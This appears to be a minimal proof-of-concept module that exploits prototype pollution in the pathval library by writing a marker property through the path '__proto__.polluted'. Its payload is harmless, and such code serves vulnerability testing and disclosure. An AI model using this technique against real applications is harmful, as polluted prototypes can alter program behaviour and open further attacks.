function exploitFunction(payload) {
    var pathval = require("pathval");

    var obj = payload.obj;
    pathval.setPathValue(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };